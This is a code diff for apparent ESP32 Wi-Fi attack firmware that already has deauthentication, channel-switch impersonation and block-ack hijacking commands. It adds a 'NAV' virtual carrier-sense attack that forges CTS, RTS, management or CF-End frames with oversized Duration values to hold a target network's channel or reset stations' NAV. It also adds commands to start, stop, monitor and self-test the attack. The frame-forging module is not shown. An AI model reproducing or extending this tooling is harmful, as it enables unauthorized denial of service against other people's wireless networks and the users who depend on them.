@@ -12,6 +12,7 @@
 #include "csa.h"
 #include "deauth.h"
 #include "delba.h"
+#include "nav.h"
 
 // Auto CSA: per-round impersonation window on the announced channel.
 #define CSA_AUTO_HOLD_MS 500
@@ -116,6 +117,11 @@ void print_help() {
   Serial.println("INFO BATX                          send one DELBA/ADDBA/BAR and print the driver verdict");
   Serial.println("INFO BAPLANT <idx> [step]          plant the reorder window once, then stay silent (window-hijack test)");
   Serial.println("INFO BARPUSH <idx> [step]          send only BARs (no ADDBA/DELBA), then stay silent");
+  Serial.println("INFO NAV <idx> [cts|rts|rtsap|mgmt|cfend|hybrid] [dur]  virtual carrier sense attack");
+  Serial.println("INFO NAVSTAT                       NAV counters only (short line while NAV runs)");
+  Serial.println("INFO NAVTX                         send one CTS/RTS/CF-End and print the driver verdict");
+  Serial.println("INFO NAVSTOP                       stop the NAV attack");
+  Serial.println("INFO NAVTEST                       dump the forged CTS/RTS/CF-End bytes");
   Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
   Serial.println("INFO RADIO                         dump the driver's sniffer state (promisc + both filters + channel)");
   Serial.println("INFO CTRLTEST                      inject 10 RTS control frames (can this radio report control frames at all?)");
@@ -349,6 +355,16 @@ void do_status() {
   Serial.print((int)delba_ba_last_error());
   Serial.print(" baplant=");
   Serial.print((unsigned)delba_ba_planted_frames());
+  Serial.print(" nav=");
+  Serial.print(nav_active() ? nav_mode_name() : "off");
+  Serial.print(" navf=");
+  Serial.print((unsigned)nav_frames());
+  Serial.print(" navc=");
+  Serial.print((unsigned)nav_cfend_frames());
+  Serial.print(" navrx=");
+  Serial.print((unsigned)nav_cts_heard());
+  Serial.print(" navdur=");
+  Serial.print((unsigned)nav_duration());
   Serial.print(" delbtr=");
   Serial.print((unsigned)delba_triggered());
   Serial.print(" delbb=");
@@ -622,6 +638,70 @@ void do_ba_attack(int index, long step) {
   Serial.printf("OK BAATTACK %d step=%ld ch=%u ssid=%s\n", index, step,
                 (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
   ui_log("ba attack started");
+}
+
+// NAV <idx> [mode] [duration]: pin the channel with an oversized Duration
+// (cts/rts/hybrid) or reset everybody's NAV with CF-End.
+void do_nav(int index, const char* mode_token, long duration) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  nav_mode_t mode = NAV_MODE_CTS;
+  if (mode_token == nullptr) {
+    mode = NAV_MODE_CTS;
+  } else if (strcmp(mode_token, "cts") == 0) {
+    mode = NAV_MODE_CTS;
+  } else if (strcmp(mode_token, "rts") == 0) {
+    mode = NAV_MODE_RTS;
+  } else if (strcmp(mode_token, "rtsap") == 0) {
+    mode = NAV_MODE_RTSAP;
+  } else if (strcmp(mode_token, "mgmt") == 0) {
+    mode = NAV_MODE_MGMT;
+  } else if (strcmp(mode_token, "cfend") == 0) {
+    mode = NAV_MODE_CFEND;
+  } else if (strcmp(mode_token, "hybrid") == 0) {
+    mode = NAV_MODE_HYBRID;
+  } else {
+    Serial.println("ERR mode must be cts, rts, rtsap, mgmt, cfend or hybrid");
+    return;
+  }
+  if (duration < 0 || duration > 32767) {
+    Serial.println("ERR duration must be 0 (default 32767) or 1..32767 microseconds");
+    return;
+  }
+  attack_stop();
+  if (!nav_start(index, mode, (uint16_t)duration)) {
+    Serial.println("ERR cannot start the NAV attack on that network");
+    return;
+  }
+  Serial.printf("OK NAV %d mode=%s dur=%u ch=%u ssid=%s\n", index, nav_mode_name(),
+                (unsigned)nav_duration(), (unsigned)WiFi.channel(index),
+                WiFi.SSID(index).c_str());
+  ui_log("nav attack started");
+}
+
+void do_nav_stop() {
+  const uint32_t frames = nav_frames();
+  const uint32_t cfend = nav_cfend_frames();
+  const uint32_t cts = nav_cts_heard();
+  nav_stop();
+  Serial.printf("OK NAVSTOP frames=%u cfend=%u cts_heard=%u\n", (unsigned)frames,
+                (unsigned)cfend, (unsigned)cts);
+  ui_log("nav attack stopped");
+}
+
+void do_nav_test() {
+  nav_selftest();
+}
+
+// Short, cheap status line: the full STATUS is too long to print reliably while
+// the NAV injection task is running.
+void do_nav_stat() {
+  Serial.printf("NAVSTAT mode=%s active=%d frames=%u errs=%u cfend=%u ctsrx=%u navdur=%u\n",
+                nav_active() ? nav_mode_name() : "off", nav_active() ? 1 : 0,
+                (unsigned)nav_frames(), (unsigned)nav_tx_errors(), (unsigned)nav_cfend_frames(),
+                (unsigned)nav_cts_heard(), (unsigned)nav_duration());
 }
 
 void do_ba_stop() {
@@ -947,6 +1027,8 @@ void do_rx_mix() {
   Serial.print((unsigned)csub[12]);
   Serial.print(" ack=");
   Serial.print((unsigned)csub[13]);
+  Serial.print(" cfend=");
+  Serial.print((unsigned)(csub[14] + csub[15]));
   Serial.print(" data=");
   Serial.print((unsigned)data);
   Serial.print(" action=");
@@ -1117,6 +1199,24 @@ void dispatch(char* line) {
     do_ba_test();
   } else if (strcmp(command, "BATX") == 0) {
     do_ba_tx();
+  } else if (strcmp(command, "NAV") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* mode_token = strtok(nullptr, " \t");
+    char* dur_token = strtok(nullptr, " \t");
+    const int nav_idx = parse_index(idx_token);
+    if (nav_idx < 0) {
+      Serial.println("ERR usage: NAV <idx> [cts|rts|cfend|hybrid] [duration 1-32767]");
+    } else {
+      do_nav(nav_idx, mode_token, dur_token ? strtol(dur_token, nullptr, 10) : 0);
+    }
+  } else if (strcmp(command, "NAVSTOP") == 0) {
+    do_nav_stop();
+  } else if (strcmp(command, "NAVTEST") == 0) {
+    do_nav_test();
+  } else if (strcmp(command, "NAVSTAT") == 0) {
+    do_nav_stat();
+  } else if (strcmp(command, "NAVTX") == 0) {
+    nav_tx_probe();
   } else if (strcmp(command, "BARPUSH") == 0) {
     char* idx_token = strtok(nullptr, " \t");
     char* step_token = strtok(nullptr, " \t");
